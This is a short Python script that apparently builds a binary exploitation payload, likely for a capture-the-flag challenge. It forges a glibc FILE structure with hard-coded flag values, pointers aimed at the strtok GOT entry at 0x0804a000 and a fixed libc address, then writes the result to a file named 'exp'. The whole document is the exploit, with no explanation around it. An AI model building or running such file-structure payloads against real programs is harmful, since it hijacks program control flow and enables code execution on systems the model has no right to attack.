
from struct import pack,unpack
from ctypes import c_int32


wb_mode = 0xfbad2484
rb_mode = 0xfbad2488  
strtok_got = 0x0804a000 


payload = pack('<I',rb_mode) + pack('<I',strtok_got) + pack('<I',strtok_got+0x100) + pack('<I',strtok_got)
payload += pack('<I',0x0)*9 + pack('<I',0xf7fbd960) + pack('<I',0xffffffff)

open('./exp','w').write(payload)